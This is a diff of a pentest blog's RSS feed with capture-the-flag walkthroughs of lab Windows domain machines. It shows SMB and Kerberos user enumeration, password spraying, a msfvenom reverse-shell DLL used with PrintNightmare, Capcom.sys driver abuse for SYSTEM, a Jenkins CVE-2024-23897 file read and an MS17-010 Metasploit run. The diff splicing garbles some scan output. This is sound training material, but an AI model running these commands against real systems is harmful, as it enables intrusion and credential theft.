+<br>又失败了<br>才看下 Whisky 用户的smb共享<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# smbmap -u Whisky -p MamasoyStream2er@ -H 192.168.69.69
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+[/] Auth[!] Unable to remove test file at \\192.168.69.69\PDF Pro Virtual Printer\LBJIFVWHAS.txt, please remove manually
+
+[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Admin remota
+        C$                                                      NO ACCESS       Recurso predeterminado
+        IPC$                                                    READ ONLY       IPC remota
+        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión
+        NETLOGON2                                               NO ACCESS
+        PACHARAN                                                NO ACCESS
+        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
+        print$                                                  NO ACCESS       Controladores de impresora
+        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
+        Users                                                   NO ACCESS
+
+<br>没有啥东西啊<br>利用 Whisky 用户的权限进行 rid-brute 收集域内用户<br>
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# crackmapexec smb PACHARAN.THL -u Whisky -p MamasoyStream2er@ --rid-brute &gt;rid-brute.txt
+
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# wc -l rid-brute.txt
+40 rid-brute.txt
+
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# cat rid-brute.txt |grep SidTypeUser |cut -d ' ' -f21|cut -d '\' -f2 &gt;valid_users.txt
+
+┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# cat valid_users.txt
+Administrador
+Invitado
+krbtgt
+DefaultAccount
+WIN-VRU3GG3DPLJ$
+Orujo
+Ginebra
+Whisky
+Hendrick
+Chivas
+Whisky2
+JB
+Chivas
+beefeater
+CarlosV
+RedLabel
+Gordons
+<br>查看打印机<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# rpcclient -U "Whisky%MamasoyStream2er@" 192.168.69.69 -c 'enumprinters'
+        flags:[0x800000]
+        name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
+        description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
+        comment:[Soy Hacker y arreglo impresoras]
+
+<br>获取到一个密码 TurkisArrusPuchuchuSiu1<br>
+密码喷涂试试<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# crackmapexec smb PACHARAN.THL -u valid_users.txt -p TurkisArrusPuchuchuSiu1 --continue-on-success |grep +
+SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1
+
+<br>Evil-winrm登录<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<br><br>在利用smb检测时我们看到存在一台打印机，那我们可以尝试利用相关漏洞<br>
+<a data-tooltip-position="top" aria-label="../../20-网安/28-CVE复现/CVE-2021-34527" data-href="../../20-网安/28-CVE复现/CVE-2021-34527" href="https://www.c1trus.top/20-网安/28-cve复现/cve-2021-34527.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2021-34527</a> 也叫 PrintNightmare漏洞<br>利用脚本 <a rel="noopener nofollow" class="external-link" href="https://github.com/JohnHammond/CVE-2021-34527" target="_blank">https://github.com/JohnHammond/CVE-2021-34527</a><br>
+这里只是wp 我直接讲如何做<br>
+先检查一下打印机相关的协议是否运行<br>┌──(kali㉿kali)-[~/thl/Pacharan]
+└─$ impacket-rpcdump @192.168.69.69 | grep -E 'MS-RPRN|MS-PAR'
+Protocol: [MS-RPRN]: Print System Remote Protocol
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+
+<br>很好 这两个协议都在运行<br>然后用msf生成一个反向dll 然后上传上去<br>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.69.3 lport=4455 -f dll -o reverse.dll
+<br>复制到一个windows下默认可写的目录下。具体的可以看这里<a rel="noopener nofollow" class="external-link" href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md" target="_blank">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a><br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; cp reverse.dll  C:\Windows\Tasks\reverse.dll
+<br>加载漏洞利用模块 然后执行dll 反弹shell<br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/CVE-2021-34527.ps1
+
+Info: Uploading /home/kali/thl/Pacharan/CVE-2021-34527.ps1 to C:\Users\Chivas Regal\Documents\CVE-2021-34527.ps
+
+Data: 238084 bytes of 238084 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; ls
+
+
+    Directorio: C:\Users\Chivas Regal\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/4/2024   3:53 PM         295936 6666.exe
+-a----        12/4/2024   8:42 PM         178563 CVE-2021-34527.ps1
+-a----        12/4/2024   8:26 PM           9216 reverse.dll
+
+
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; Import-Module .\CVE-2021-34527.ps1
+
+nc -lvnp 4455
+
+Invoke-Nightmare -DLL 'C:\Windows\Tasks\reverse.dll'
+<br>然后就可以获取到系统用户的shell了<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
+└─# nc -lvnp 4455
+listening on [any] 4455 ...
+connect to [192.168.69.3] from (UNKNOWN) [192.168.69.69] 49194
+Microsoft Windows [Versi▒n 10.0.14393]
+(c) 2016 Microsoft Corporation. Todos los derechos reservados.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+<br>c:\Users\Chivas Regal\Desktop&gt;type user.txt
+type user.txt
+bb8b4df8eda73e75ca51ca88a909c1cb  -
+
+
+c:\Users\Administrador\Desktop&gt;type root.txt
+type root.txt
+cfa7cb1cc20e26c0428f9222d44c76a0  -
+
+<br><br>查看权限时可以看到我们有 <a data-tooltip-position="top" aria-label="../渗透姿势库/SeLoadDriverPrivilege" data-href="../渗透姿势库/SeLoadDriverPrivilege" href="https://www.c1trus.top/24-渗透/渗透姿势库/seloaddriverprivilege.html" class="internal-link" target="_self" rel="noopener nofollow">SeLoadDriverPrivilege</a>权限<br>
+该权限允许用户或进程在系统上加载和卸载设备驱动程序。<br>
+通常，只有管理员或受信任的系统进程才会被授予此权限<br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; whoami /priv
+
+INFORMACIàN DE PRIVILEGIOS
+--------------------------
+
+Nombre de privilegio          Descripci¢n                                     Estado
+============================= =============================================== ==========
+SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
+SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
+SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada
+
+<br>然后可以从<a data-tooltip-position="top" aria-label="https://github.com/k4sth4/SeLoadDriverPrivilege" rel="noopener nofollow" class="external-link" href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">这里</a> 获取到漏洞利用的相关工具<br>上传相关工具：
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/ExploitCapcom.exe
+
+Info: Uploading /home/kali/thl/Pacharan/ExploitCapcom.exe to C:\Users\Chivas Regal\Documents\ExploitCapcom.exe
+
+Data: 387752 bytes of 387752 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/eoploaddriver_x64.exe
+
+Info: Uploading /home/kali/thl/Pacharan/eoploaddriver_x64.exe to C:\Users\Chivas Regal\Documents\eoploaddriver_x64.exe
+
+Data: 92840 bytes of 92840 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/Capcom.sys
+
+Info: Uploading /home/kali/thl/Pacharan/Capcom.sys to C:\Users\Chivas Regal\Documents\Capcom.sys
+
+Data: 14100 bytes of 14100 bytes copied
+
+Info: Upload successful!
+
+
+加载恶意驱动程序：
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; .\ExploitCapcom.exe LOAD c:\windows\tasks\Capcom.sys
+[*] Service Name: drlynhqu
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\?????????????????
+NTSTATUS: 00000000, WinError: 0
+
+
+漏洞利用 特权用户执行命令
+*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; .\ExploitCapcom.exe EXPLOIT whoami
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 00000239224D0008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] Command Executed
+nt authority\system
+
+]]></description><link>https://www.c1trus.top/24-渗透/thl/2.pacharan.html</link><guid isPermaLink="false">24-渗透/THL/2.Pacharan.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[10.Cyberguard]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a><br>
+靶机链接<br>
+难度 ⭐️⭐️⭐️⭐️⭐️
+]]></description><link>https://www.c1trus.top/24-渗透/thl/10.cyberguard.html</link><guid isPermaLink="false">24-渗透/THL/10.Cyberguard.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[1.Chimichurri]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+<br><a data-tooltip-position="top" aria-label="3. SMB空会话检测" data-href="#3. SMB空会话检测" href="https://www.c1trus.top/about:blank#3._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3. SMB空会话检测</a>
+<br><a data-tooltip-position="top" aria-label="4. rid-brute获取域内用户" data-href="#4. rid-brute获取域内用户" href="https://www.c1trus.top/about:blank#4._rid-brute获取域内用户" class="internal-link" target="_self" rel="noopener nofollow">4. rid-brute获取域内用户</a>
+<br><a data-tooltip-position="top" aria-label="5. ldap获取域内基础信息" data-href="#5. ldap获取域内基础信息" href="https://www.c1trus.top/about:blank#5._ldap获取域内基础信息" class="internal-link" target="_self" rel="noopener nofollow">5. ldap获取域内基础信息</a>
+<br><a data-tooltip-position="top" aria-label="6. kerbrute枚举出域内用户" data-href="#6. kerbrute枚举出域内用户" href="https://www.c1trus.top/about:blank#6._kerbrute枚举出域内用户" class="internal-link" target="_self" rel="noopener nofollow">6. kerbrute枚举出域内用户</a>
+<br><a data-tooltip-position="top" aria-label="7. 密码喷涂" data-href="#7. 密码喷涂" href="https://www.c1trus.top/about:blank#7._密码喷涂" class="internal-link" target="_self" rel="noopener nofollow">7. 密码喷涂</a>
+<br><a data-tooltip-position="top" aria-label="8. Jenkins利用" data-href="#8. Jenkins利用" href="https://www.c1trus.top/about:blank#8._Jenkins利用" class="internal-link" target="_self" rel="noopener nofollow">8. Jenkins利用</a>
+<br><a data-tooltip-position="top" aria-label="9. 提权" data-href="#9. 提权" href="https://www.c1trus.top/about:blank#9._提权" class="internal-link" target="_self" rel="noopener nofollow">9. 提权</a>
+<br><a data-tooltip-position="top" aria-label="10. 降权" data-href="#10. 降权" href="https://www.c1trus.top/about:blank#10._降权" class="internal-link" target="_self" rel="noopener nofollow">10. 降权</a><br>
+靶机链接 thehackerslabs.com/chimichurri/<br>
+难度 ⭐️⭐️⭐️️
+<br><br>┌──(root㉿kali)-[~]
+└─# fscan -h 192.168.200.4
 
    ___                              _
   / _ \     ___  ___ _ __ __ _  ___| | __
  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
 / /_\\_____\__ \ (__| | | (_| | (__|   &lt;
 \____/     |___/\___|_|  \__,_|\___|_|\_\
-                     fscan version: 2.0.0
-[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
-[*] 开始信息扫描...
-[*] 最终有效主机数量: 1
-[*] 共解析 218 个有效端口
-[+] 端口开放 192.168.56.17:139
-[+] 端口开放 192.168.56.17:445
-[+] 端口开放 192.168.56.17:135
-[+] 存活端口数量: 3
-[*] 开始漏洞扫描...
-[!] 扫描错误 192.168.56.17:139 - netbios error
+                     fscan version: 1.8.4
+start infoscan
+192.168.200.4:88 open
+192.168.200.4:139 open
+192.168.200.4:135 open
+192.168.200.4:445 open
+[*] alive ports len is: 4
+start vulscan
 [*] NetInfo
-[*] 192.168.56.17
-   [-&gt;] experience
-   [-&gt;] 192.168.56.17
-[+] MS17-010 192.168.56.17      (Windows 5.1)
-[+] 扫描已完成: 3/3
-[*] 扫描结束,耗时: 45.275206ms
+[*]192.168.200.4
+   [-&gt;]CHIMICHURRI
+   [-&gt;]192.168.200.4
+[*] NetBios 192.168.200.4   [+] DC:CHIMICHURRI0\CHIMICHURRI
+已完成 4/4
+[*] 扫描结束,耗时: 1.070314445s
 
-<br><br>msfconsole
-use exploit/windows/smb/ms17_010_psexec
-set lhost 192.168.56.6
-set rhost 192.168.56.17
-run 
+┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# nmap -sC -sV 192.168.200.4
+Nmap scan report for CHIMICHURRI0.local (192.168.200.4)
+Host is up (0.00043s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-03 10:37:33Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+6969/tcp open  http          Jetty 10.0.11
+|_http-title: Panel de control [Jenkins]
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Jetty(10.0.11)
+MAC Address: 08:00:27:B8:51:4D (Oracle VirtualBox virtual NIC)
+Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-time:
+|   date: 2024-12-03T10:37:33
+|_  start_date: 2024-12-03T10:04:56
+|_nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:b8:51:4d (Oracle VirtualBox virtual NIC)
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: 5h59m57s
 
-C:\Documents and Settings\bill\Desktop&gt;type root.txt
-type root.txt
-c1d5e7e4efece4a6022c4a4080c8114d
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds
 
-C:\Documents and Settings\bill\Desktop&gt;type user.txt
-type user.txt
-f9e24c8da0686680decee9e594178a2e
+<br>域名 CHIMICHURRI0<br>
+配置一下 etc/hosts<br>192.168.200.4 chimichurri.thl
+<br><br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# smbmap -u anonymous -H 192.168.200.4
 
-]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/1.experience.html</link><guid isPermaLink="false">24-渗透/Vulnyx/1.Experience.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[Home]]></title><description><![CDATA[ 
- <br>continue...<br><br><br><br><br><br><br>...]]></description><link>https://www.c1trus.top/40-obsidian/home.html</link><guid isPermaLink="false">40-Obsidian/Home.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Sat, 28 Dec 2024 14:38:49 GMT</pubDate></item></channel></rss>
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+
+[+] IP: 192.168.200.4:445       Name: chimichurri.thl        Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Admin remota
+        C$                                                      NO ACCESS       Recurso predeterminado
+        drogas                                                  READ ONLY
+        IPC$                                                    READ ONLY       IPC remota
+        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión
+        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
+
+<br>查看smb共享目录<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# smbclient -U '' //chimichurri.thl/drogas
+Password for [WORKGROUP\]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Jun 27 18:20:49 2024
+  ..                                  D        0  Thu Jun 27 18:20:49 2024
+  credenciales.txt                    A       95  Mon Jul  1 01:19:03 2024
+
+                7735807 blocks of size 4096. 4368462 blocks available
+
+smb: \&gt; get credenciales.txt
+getting file \credenciales.txt of size 95 as credenciales.txt (46.4 KiloBytes/sec) (average 46.4 KiloBytes/sec)
+smb: \&gt; exit
+
+┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# smbclient -U '' //chimichurri.thl/IPC$
+Password for [WORKGROUP\]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls -a
+NT_STATUS_NO_SUCH_FILE listing \-a
+smb: \&gt; exit
+
+<br>查看文件内容<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# cat credenciales.txt
+Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico     
+<br>
+这句西班牙语的意思是：<br>
+“所有事情都会更好，因为有黑客用户，他的桌子上有他的访问密钥，就像鹦鹉一样。”<br>
+其中“como perico”是个比喻，可能意味着“很显眼”或“随意放置”，暗示这些密钥没有被妥善保护。
+<br><br>因为存在 smb空会话 所以我们可以进行 rid-brute 获取域内用户<br>
+rid-brute 只需要有一个域内合法用户即可进行。
+<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# crackmapexec smb chimichurri.thl -u 'guest ' -p ' ' --rid-brute
+
+┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# crackmapexec smb chimichurri.thl -u 'guest ' -p ' ' --rid-brute
+SMB         chimichurri.thl 445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
+SMB         chimichurri.thl 445    CHIMICHURRI      [+] chimichurri.thl\guest :
+SMB         chimichurri.thl 445    CHIMICHURRI      [-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+<br>失败了。 这里对匿名用户的权限做了设置<br><br>ldapsearch -x -H ldap://192.168.200.4 -s 'base' namingcontexts
+
+┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# ldapsearch -x -H ldap://192.168.200.4 -s 'base' namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+
+#
+dn:
+namingContexts: DC=chimichurri,DC=thl
+namingContexts: CN=Configuration,DC=chimichurri,DC=thl
+namingContexts: CN=Schema,CN=Configuration,DC=chimichurri,DC=thl
+namingContexts: DC=DomainDnsZones,DC=chimichurri,DC=thl
+namingContexts: DC=ForestDnsZones,DC=chimichurri,DC=thl
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+<br>没啥有用的东西<br><br>我们目前需要一个可用的域用户。由于对匿名用户做了限制不让进行 rid-brute 直接获取域内用户。 那只能尝试爆破枚举了<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# kerbrute userenum -d chimichurri.thl -t 100 --dc 192.168.200.4  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 12/03/24 - Ronnie Flathers @ropnop
+
+2024/12/03 12:49:28 &gt;  Using KDC(s):
+2024/12/03 12:49:28 &gt;   192.168.200.4:88
+
+2024/12/03 12:49:28 &gt;  [+] VALID USERNAME:       hacker@chimichurri.thl
+2024/12/03 12:49:28 &gt;  [+] VALID USERNAME:       Hacker@chimichurri.thl
+2024/12/03 12:49:33 &gt;  [+] VALID USERNAME:       invitado@chimichurri.thl
+2024/12/03 12:49:47 &gt;  [+] VALID USERNAME:       administrador@chimichurri.thl
+2024/12/03 12:49:48 &gt;  [+] VALID USERNAME:       HACKER@chimichurri.thl
+
+2024/12/03 12:54:16 &gt;  Done! Tested 8295455 usernames (5 valid) in 288.265 seconds
+
+┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# awk '{print $7}' valid_user.txt | sed 's/@.*//' &gt;kerber_brute_users.txt
+
+┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# cat kerber_brute_users.txt
+hacker
+Hacker
+invitado
+administrador
+HACKER
+
+<br>尝试利用这些用户的名字作为密码进行爆破<br><br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# crackmapexec smb chimichurri.thl -u kerber_brute_users.txt -p kerber_brute_users.txt --no-bruteforce --continue-on-success
+SMB         chimichurri.thl 445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
+SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\hacker:hacker STATUS_LOGON_FAILURE
+SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\Hacker:Hacker STATUS_LOGON_FAILURE
+SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\invitado:invitado STATUS_LOGON_FAILURE
+SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\administrador:administrador STATUS_LOGON_FAILURE
+SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\HACKER:HACKER STATUS_LOGON_FAILURE
+<br>看来不存在将用户名作为密码的用户<br><br>观察nmap的结果可以发现靶机是开放了Jenkins的<br>6969/tcp open  http          Jetty 10.0.11
+|_http-title: Panel de control [Jenkins]
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Jetty(10.0.11)
+MAC Address: 08:00:27:B8:51:4D (Oracle VirtualBox virtual NIC)
+Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows
+<br><img alt="Pasted image 20241203133056" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" referrerpolicy="no-referrer"><br>
+jenkins是有很多漏洞的<br>
+先去找一个最新的试试<br>
+<a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/" target="_blank">https://www.exploit-db.com/</a><br>
+<img alt="Pasted image 20241203134231" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203134231.png" referrerpolicy="no-referrer"><br>试试这个LFI （<a data-tooltip-position="top" aria-label="../../20-网安/28-CVE复现/CVE-2024-23897" data-href="../../20-网安/28-CVE复现/CVE-2024-23897" href="https://www.c1trus.top/20-网安/28-cve复现/cve-2024-23897.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2024-23897</a>）<br>之前的 credenciales.txt 提示我们在 hacker 用户的桌面有一个凭证<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# cat credenciales.txt
+Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico     
+<br>
+这句西班牙语的意思是：<br>
+“所有事情都会更好，因为有黑客用户，他的桌子上有他的访问密钥，就像鹦鹉一样。”<br>
+其中“como perico”是个比喻，可能意味着“很显眼”或“随意放置”，暗示这些密钥没有被妥善保护。
+<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# python3 51993.py -u http://192.168.200.4:6969
+Press Ctrl+C to exit
+File to download:
+&gt; /users/hacker/desktop/perico.txt
+hacker:Perico69
+
+<br>成功获取 hacker 用户的密码<br>尝试看能不能登录<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# evil-winrm -i 192.168.200.4 -u hacker -p Perico69
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\hacker\Documents&gt;
+
+<br>成功登录<br><br>先看一下当前用户的权限<br>INFORMACIàN DE PRIVILEGIOS
+--------------------------
+
+Nombre de privilegio          Descripci¢n                                  Estado
+============================= ============================================ ==========
+SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
+SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
+SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
+
+<br>SeImpersonatePrivilege 权限允许我们利用别人的用户权限进行命令执行<br>
